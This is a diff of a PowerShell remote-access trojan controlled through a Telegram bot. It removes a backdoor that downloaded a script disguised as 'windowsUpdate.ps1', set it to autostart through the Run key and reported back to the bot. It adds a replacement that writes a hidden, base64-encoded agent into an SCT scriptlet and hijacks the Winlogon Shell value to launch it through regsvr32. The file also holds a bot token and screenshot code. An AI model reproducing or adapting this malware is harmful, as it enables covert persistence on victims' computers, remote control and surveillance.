@@ -53,7 +53,7 @@ return $codeScript
 
 #$botkey = "734458093:AAFNojUkBQN1Nbft4fqONRGxctvA0yim7nA"
 #$bot_Master_ID = '611715845'
-$githubScript = 'https://raw.githubusercontent.com/whobornin1980/bot/master/Functions.ps1'
+#$githubScript = 'https://raw.githubusercontent.com/whobornin1980/bot/master/Functions.ps1'
 
 
 ###############
@@ -103,23 +103,14 @@ function turnOffScreen {
 }
 
 function backdoor {
-        reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /f
-        
-        Send-Message "Downloading.."
-        Invoke-WebRequest -Uri $githubScript -OutFile C:\Users\$env:username\Documents\windowsUpdate.ps1
+If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
+{Send-Message "Sorry, necesitas privilegios"; return Send-Message;break }  else {
+$agent_bot = create_agent -botkey $botkey -chat_id $chat_id;  $agent_bot = $agent_bot -replace "con bypassuac :D","" ; $code = code_a_base64 -code $agent_bot; $code = "powershell.exe -win hidden -enc " + $code
+$plantilla_sct =  (crea_plantilla_sct -code $code); $plantilla_sct | Out-File -Encoding ascii "C:\Users\Public\Libraries\log2.sct" ;
+Set-ItemProperty "registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name Shell -value "explorer.exe, c:\windows\system32\regsvr32.exe /s /n /u /i:C:\Users\Public\Libraries\log2.sct scrobj.dll"
+Send-Message "" ; Send-Message "Persistencia ejecutada correctamente"} return Send-Message;break}
 
-        Send-Message "Adding_to_the_reg.."
-		reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"
 
-        # Check backdoor
-        #$checkBackdoor = Get-CimInstance Win32_StartupCommand | Select-String windowsUpdate
-        $checkBackdoor = reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run | Select-String windowsUpdate
-        Invoke-RestMethod -Uri "https://api.telegram.org/bot$($botkey)/sendMessage?chat_id=$($bot_Master_ID)&text=$($checkBackdoor)"
-		
-        # Backdoor on startup programs
-        $command = cmd.exe /c "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"
-        Invoke-Expression -Command:$command
-}
 
 function screenshot {
       [Reflection.Assembly]::LoadWithPartialName("System.Drawing")
